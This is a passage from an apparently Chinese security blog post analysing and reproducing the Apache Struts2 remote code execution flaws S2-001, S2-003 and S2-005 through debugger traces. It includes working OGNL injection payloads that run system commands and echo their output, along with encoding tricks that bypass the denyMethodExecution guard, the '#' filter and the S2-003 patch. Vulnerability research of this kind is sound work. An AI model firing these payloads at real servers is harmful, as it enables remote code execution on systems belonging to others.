src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/11.png"></p><p>同时可以发现<code>stack.setValue</code>方法执行过后，此时<code>Action</code>方法对象（我这里是<code>LoginAction</code>）中的<code>password</code>已经赋值完毕了</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/12.png"></p><p>接下来就会通过<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code>方法来反射调用目标业务层的Action的方法。</p><p>查看该方法可以发现是调用<code>StrutsActionProxy</code>获取<code>struts.xml</code>文件中数据得到<code>actionName</code>、<code>method</code>名（如果在<code>struts.xml</code>中没有设置的话，则默认方法是<code>execute</code>），最后利用反射调用。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/13.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/14.png"></p><p>通过反射进入到<code>LoginAction#execute</code>方法，经过一系列处理，在我这里返回的是<code>error</code>。接下来就是对结果<code>error</code>的处理</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/15.png"></p><p>执行<code>StrutsResultSupport.doExcute()</code>后框架将会开始处理页面回显，而其中会调用中间件tomcat调度器<code>ApplicationDispatcher</code>，由于访问jsp文件，会调用<code>JspServlet</code>处理请求。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/16.png"></p><p>当在 <code>JSP</code>文件中遇到 <code>Struts2</code> 标签 <code>&lt;s:textfield</code> 时，程序会先调用 <code>doStartTag</code> ，并将标签中的属性设置到 <code>TextFieldTag</code>对象相应属性中。最后，在遇到 <code>/&gt;</code>结束标签的时候调用 <code>doEndTag</code>方法。</p><p>在<code>doEndTag</code>方法里会调用<code>TextFieldTag</code>对象的<code>end</code>方法：</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/17.png"></p><p>跟进<code>end</code>方法查看，发现调用<code>evaluateParams()</code>方法。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/18.png"></p><p>跟进<code>evaluateParams()</code>，发现该方法是用来进行数据填充操作的。同时会发现如果开启了 <code>Ognl</code>表达式支持( <code>this.altSyntax()</code> )，程序会在属性字段两边添加 <code>Ognl</code> 表达式字符( <code>%&#123;、&#125;</code> )</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/19.png"></p><p>然后使用 <code>findValue</code> 方法从值栈中获得该表达式所对应的值。</p><p>跟进<code>findValue</code>方法，发现会调用<code>TextParseUtil</code>对象的<code>translateVariables</code>方法。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/20.png"></p><p>而该<code>TextParseUtil</code>对象的<code>translateVariables</code>方法又会调用同名重载的方法。而问题就出现在这个同名重载的方法中。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/21.png"></p><p>在最开始，我们传入 <code>translateVariables</code> 方法的表达式 <code>expression</code> 为 <code>%&#123;password&#125;</code> ，经过 <code>Ognl</code>表达式解析，程序会获得其值 <code>%&#123;1+1&#125;</code> 。这个值在先前经过 <code>ParametersInterceptor</code> 拦截器的时候设置了。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/22.png"></p><p>表达式最终变成<code>%&#123;1+1&#125;</code>，同时由于此处使用的是 <code>while</code> 循环来解析 <code>Ognl</code> ，所以表达式 <code>%&#123;1+1&#125;</code> 又会被再次执行，最终也就造成了任意代码执行。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/24.png"></p><p>我们来看看表达式为何被执行？</p><p>在获得<code>%&#123;1+1&#125;</code>表达式之后，程序将<code>%&#123;&#125;</code>去掉后，数据传入<code>OgnlValueStack#findValue</code>方法进行处理，在代码196行的时候，又用<code>OgnlUtil.getValue</code>处理了我们的表达式</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/25.png"></p><p>跟进<code>OgnlUtil.getValue</code>方法可以发现程序用<code>Ognl.getValue</code>方法处理了我们的表达式，<code>Ognl.getValue</code>第一个参数只要受到用户控制，便可以触发RCE。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/26.png"></p><h3 id="5-修复"><a href="#5-修复" class="headerlink" title="5.修复"></a>5.修复</h3><p>官方采用的修复方法是在代码中多了 <code>Ognl</code> 递归解析次数的判断，默认情况下仅解析第一层。（XWork 2.0.4中修复）</p><h2 id="2-Struts2-003"><a href="#2-Struts2-003" class="headerlink" title="2.Struts2-003"></a>2.Struts2-003</h2><h3 id="1-漏洞概要"><a href="#1-漏洞概要" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h3><p>Struts2-003是一个远程代码执行漏洞，Struts2-005为Struts2-003补丁绕过。</p><p>影响版本： <code>Struts 2.0.0 - Struts 2.1.8.1</code> 。更多详情可参考官方通告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-003">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p><h3 id="2-漏洞环境搭建-1"><a href="#2-漏洞环境搭建-1" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h3><p>因为Struts2.0.8也在受漏洞影响的，因此我就沿用<code>Struts2-01</code>的漏洞环境，具体漏洞搭建方法看上文。</p><h3 id="3-漏洞复现-1"><a href="#3-漏洞复现-1" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>POC：<code>http://localhost:8080/S2_03_war_exploded/login.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#39;deepin-calculator\&#39;)&#39;)(bla)(bla)</code></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/27.png"></p><p>回显EXP：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">A</span>)((&#x27;\u0023mydat\u003dnew\<span class="hljs-number">40</span>java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">B</span>)((&#x27;\u0023myres\u003dnew\<span class="hljs-number">40</span>byte[<span class="hljs-number">51020</span>]&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">C</span>)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">D</span>)((&#x27;\u0023mystr\u003dnew\<span class="hljs-number">40</span>java.lang.String(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">E</span>)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(<span class="hljs-name">bla</span>))<br></code></pre></td></tr></table></figure><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/37.png"></p><h3 id="4-漏洞分析-1"><a href="#4-漏洞分析-1" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>本次漏洞是通过绕过 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code>这个拦截器。的过滤，进而执行 <code>OGNL</code> 表达式。</p><p>我们还是在这个拦截器下的<code>doIntercept</code>下断点，然后发送<code>(@java.lang.Runtime@getRuntime().exec(&#39;deepin-calculator&#39;))(reader-l)(amadeus)</code>进行跟踪。</p><p>依旧是存放 <code>HTTP</code> 数据的 <code>parameters</code> 变量将通过 <code>setParameters</code> 方法设置到<code>ValueStack</code>值栈中</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/28.png"></p><p>我们跟进该方法，我们可以发现得到前端传入的键值后，就调用<code>stack.setValue</code>处理键值。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/29.png"></p><p>跟进<code>stack.setValue</code>方法，可以看到用<code>OgnlUtil.setValue</code>处理了表达式。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/30.png"></p><p>继续跟进，可以发现漏洞的触发点<code>Ognl.setValue()</code>，我在上面有过普及<code>Ognl.setValue</code>是可以执行JAVA代码从而进行命令执行的！！</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/31.png"></p><p>但是在这里我们并没有弹出计算器，这是为什么？</p><p>这是因为我们在<code>ParametersInterceptor</code>拦截器的<code>doIntercept</code>方法，在调用<code>setParameters</code>之前程序设置了<code>denyMethodExecution</code>，其值为<code>true</code>，这是程序为了防止用户命令执行的一个方法。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/32.png"></p><p>该防护的判断逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">callStaticMethod</span><span class="hljs-params">(Map context, Class aClass, String string, Object[] objects)</span> <span class="hljs-keyword">throws</span> MethodFailedException </span>&#123;<br>        Boolean exec = (Boolean)context.get(<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>);<br>        <span class="hljs-keyword">boolean</span> e = exec == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">false</span> : exec;<br>        <span class="hljs-keyword">return</span> !e ? <span class="hljs-keyword">super</span>.callStaticMethod(context, aClass, string, objects) : <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>因此我们需要修改一下POC：通过OGNL表达式将这个值设置为<code>false</code>。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-string">&quot;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)&amp;(<span class="hljs-string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)<br></code></pre></td></tr></table></figure><p>再次尝试利用，发现还是无法弹出计算器，对POC在代码中的执行进行跟踪，发现程序对<code>#</code>有进行过滤的操作。</p><p>在<code>setParameters</code>方法中，程序调用了<code>acceptableName</code>方法进行过滤，最后POC不完整。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/33.png"></p><p>因此需要绕过该方法的对非法字符<code>#</code>的检查，大佬们的方法是将<code>#</code>编码成<code>\u0023</code>来实现绕过，同时为了解决url传参导致程序将<code>=</code>作为赋值运算符，我们也统一将器编码<code>\u003d</code>，对于<code>@</code>，在这里程序虽然没有进行黑名单的过滤，但是我们也需要将其进行编码，这是因为如果不编码的话，程序会先执行<code>(&quot;@java.lang.Runtime@getRuntime().exec(&#39;deepin-calculator&#39;)&quot;)(a)(b)</code>这段执行命令的代码，而我们绕过<code>denyMethodExecution</code>还未执行，而进行编码，执行顺序则会是正常预期。（我猜是因为编码后，<code>=</code>的编码值在<code>#</code>编码值之后，就会按照key的大小来排序，程序才会正常）</p><p>将<code>POC</code>修改成如下</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-string">&quot;\u0023context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]\u003dfalse&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)&amp;(<span class="hljs-string">&quot;\u0040java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)<br></code></pre></td></tr></table></figure><p>我们也可以通过如下方法来控制排序：利用<code>A～Z</code>字母在<code>ascii</code>的排序。这样就不需要将<code>@</code>进行编码了</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-string">&quot;\u0023context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]\u003dfalse&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)&amp;(<span class="hljs-name">A</span>)((<span class="hljs-string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>))<br></code></pre></td></tr></table></figure><p>那为啥要用<code>\u00?</code>格式的编码呢，这是因为在执行<code>Ognl.setValue</code>之前，会对提交的poc进行相对应的解码。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/34.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/35.png"></p><p>最后成功执行命令，弹出计算器。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/36.png"></p><h3 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h3><p>​    官方的修复主要是对<code>xwork2</code>进行修改，对修复前后两个版本的xwork的jar包做一个比对，可以看到关键的修复部分在<code>ParametersInterceptor</code>的<code>setParameters</code>处以及<code>OgnlValueStack</code>新增两个成员属性。</p><blockquote><p>修复代码主要引入控制静态方法调用开关 <strong>allowStaticMethodAccess</strong> 变量，以及用于控制成员变量的访问权限的 <strong>SecurityMemberAccess</strong> 类对象。然而通过 <strong>OGNL</strong> 表达式，我们完全可以控制这两个变量的值，这也导致 <strong>Struts2-003</strong> 补丁可以被绕过，即后来的 <strong>Struts2-005</strong> 漏洞。</p></blockquote><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/38.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/39.png"></p><h2 id="3-Struts2-005"><a href="#3-Struts2-005" class="headerlink" title="3.Struts2-005"></a>3.Struts2-005</h2><h3 id="1-漏洞概要-1"><a href="#1-漏洞概要-1" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h3><p>​    S2-005就是对于S2-003的绕过，从上面的修复可以看到，补丁的关键部分在于通过对<code>securityMemberAccess</code>对象的两个成员变量<code>allowStaticMethodAccess</code>和<code>excludeProperties</code>对OGNL表达式静态方法的执行有了更深的限制，然而通过OGNL表达式，我们可以改写这两个变量的值（和<code>denyMethodExecution</code>是一个套路），来实现补丁的绕过。我们需要做的事情就是保证<code>allowStaticMethodAccess</code>的值为真，<code>excludeProperties</code>的值为空。</p><h3 id="2-漏洞环境"><a href="#2-漏洞环境" class="headerlink" title="2.漏洞环境"></a>2.漏洞环境</h3><p>tomcat6.0 + struts2.0.12</p><h3 id="3-漏洞复现-2"><a href="#3-漏洞复现-2" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>POC：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">login</span><span class="hljs-selector-class">.action</span>?(<span class="hljs-string">&#x27;\u0023context[\&#x27;</span>xwork.MethodAccessor.denyMethodExecution\<span class="hljs-string">&#x27;]\u003dfalse&#x27;</span>)(bla)(bla)<span class="hljs-selector-tag">&amp;</span>(<span class="hljs-string">&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;</span>)(bla)(bla)<span class="hljs-selector-tag">&amp;</span>(<span class="hljs-string">&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;</span>)(bla)(bla)<span class="hljs-selector-tag">&amp;</span>(<span class="hljs-string">&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;</span>deepin-calculator\<span class="hljs-string">&#x27;)&#x27;</span>)(bla)(bla)<br></code></pre></td></tr></table></figure><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/40.png"></p><p>这是从网上找的回显EXP：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">A</span>)((&#x27;\u0023mydat\u003dnew\<span class="hljs-number">40</span>java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">B</span>)((&#x27;\u0023myres\u003dnew\<span class="hljs-number">40</span>byte[<span class="hljs-number">51020</span>]&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">C</span>)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">D</span>)((&#x27;\u0023mystr\u003dnew\<span class="hljs-number">40</span>java.lang.String(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">E</span>)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(<span class="hljs-name">bla</span>))<br></code></pre></td></tr></table></figure><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/41.png"></p><p>这是我自己构造的一个回显EXP：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">A</span>)((&#x27;\u0023mytes\u003dnew\<span class="hljs-number">40</span>java.io.InputStreamReader(\u0023myret.getInputStream())&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">B</span>)((&#x27;\u0023mydat\u003dnew\<span class="hljs-number">40</span>java.io.BufferedReader(\u0023mytes)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">C</span>)((&#x27;\u0023mycha\u003dnew\<span class="hljs-number">40</span>char[<span class="hljs-number">65535</span>]&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">D</span>)((&#x27;\u0023mydat.read(\u0023mycha)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">E</span>)((&#x27;\u0023mystr\u003dnew\<span class="hljs-number">40</span>java.lang.String(\u0023mycha)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">F</span>)((&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext\u0040getResponse()&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">G</span>)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(<span class="hljs-name">bla</span>))<br></code></pre></td></tr></table></figure><p>相同回显效果。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/42.png"></p><p>以上的的利用payload中的<code>(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(bla)(bla)</code>不一定需要设置，因为在一些版本中已经默认为<code>true</code>了。</p><h3 id="4-漏洞分析-2"><a href="#4-漏洞分析-2" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>​    该漏洞只是绕过官方对<code>S2-03</code>漏洞的补丁，所以这个漏洞大体上是和<code>Struts2-03</code>漏洞一致，也是通过用户控制<code>Ognl.setValue()</code>第一个参数位置导致的JAVA代码的任意执行，因此这次分析的重点是在大佬们是如何绕过该补丁。</p><p>​    从下面三张图，我们可以发现在<code>setParameters</code>方法中原本<code>stack.setValue</code>变成了<code>newStack.setValue</code>，ParametersInterceptor中对当前值栈重新初始化valueStack，向当前newStack中新增一个<code>securityMemberAccess</code>对象而该对象中定义了字段<code>allowStaticMethodAccess</code>、<code>excludeProperties</code>、<code>acceptProperties</code>作为新的沙箱进一步限制静态方法执行。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/43.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/38.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/39.png"></p><p>其中，从图中我们可以看出，<code>allowStaticMethodAccess</code>是默认为<code>true</code>的，因此在该版本中，他并不是影响我们方法执行的关键字段。</p><p><code>excludeProperties</code>、<code>acceptProperties</code>是如何影响我们的代码执行的，具体需要跟进<code>Ognl</code>表达式执行JAVA代码的具体逻辑里面。需要到<code>ognl</code>的库中(<code>ognl-2.6.11.jar</code>)<code>ognl.OgnlRuntime#callAppropriateMethod</code>这个方法去看。</p><p>在这个<code>ognl.OgnlRuntime#callAppropriateMethod</code>下个断点同时发送弹计算器的POC进行跟踪：</p><p>可以发现当对<code>(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)</code>解析执行到下图红框位置的时候，就会执行弹计算器的效果。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/44.png"></p><p>跟进<code>invokeMethod</code>方法，可以发现是采用反射的方式进行JAVA代码的执行。这就是<code>Ognl.setValue</code>和<code>Ognl.getValue</code>方法执行JAVA代码的原因。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/45.png"></p><p>回到<code>callAppropriateMethod</code>方法，我们可以发现要想调用<code>invokeMethod</code>方法进而进行JAVA代码的命令执行，我们需要进入<code>try</code>语句中，同时不能进入到如下<code>if</code>条件语句中，否则会抛出<code>NoSuchMethodException</code>异常，从而无法到<code>invokeMethod</code>方法处进行处理，也就无法进行JAVA代码的执行进而命令执行了。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/46.png"></p><p>进入到这个<code>if</code>条件判断语句块中需要满足两个条件，一个是<code>method</code>为<code>null</code>，另一个条件是<code>isMethodAccessible</code>方法返回<code>false</code>。第一个条件我们是不会满足的，因此注重第二个条件，<strong>我们需要让<code>isMethodAccessible</code>返回true</strong>。</p><p>跟进<code>isMethodAccessible</code>看一下，首先程序会先调用我们的上下文<code>OgnlContext</code>对象的<code>getMemberAccess</code>方法</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/47.png"></p><p>跟进<code>getMemberAccess</code>方法，可以发现程序会获取<code>OgnlContext</code>上下文的<code>SecurityMemberAccess</code>对象，也就是这次补丁新增的对象，并将其返回。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/48.png"></p><p>接着就是调用<code>isAccessiable</code>，跟进看一下：仔细一看，我们可以知道，如果要返回<code>true</code>的话。我们决不能进入到下图两个<code>if</code>条件语句块中（红叉处），其中<code>this.getAllowStaticMethodAccess()</code>是我们可以控制的，因为<code>allowStaticMethodAccess</code>默认为<code>true</code>（即使不是默认为<code>true</code>，我们也可以利用ognl表达式修改它的值）。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/49.png"></p><p>同时我们要保证<code>this.isAcceptableProperty(propertyName)</code>返回<code>true</code>。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/50.png"></p><p>如下两张图分别是<code>isAccepted</code>和<code>isExcluded</code>方法，仔细审计可以知道要满足以上的<code>isAccepted</code>返回<code>true</code>和<code>isExcluded</code>返回<code>false</code>的条件是<code>acceptProperties</code>和<code>excludeProperties</code>都为空。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/51.png"></p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/52.png"></p><p>其中<code>acceptProperties</code>默认为空，因此我们只要设置<code>excludeProperties</code>为空即可。</p><p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/53.png"></p><p>那我们如何通过外部引用来设置<code>excludeProperties</code>的值呢？这个我一直没想到是如何做到的，我只能看<a href="https://zhzhdoai.github.io/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-005/">大佬的文章</a>[捂脸]一步一步调试。</p><blockquote><p>了解外部引用对象逻辑需要跟进<code>ASTVarRef::geValueBody=&gt;OgnlContext::get</code>,通过<code>#_memberAccess</code>就能够获取<code>SecurityMemberAccess</code>对象，就能够进一步修改<code>this.acceptProperties=false</code></p></blockquote><h3 id="5-漏洞修复-1"><a href="#5-漏洞修复-1" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h3><p>修复代码最终使用了更加严格的正则 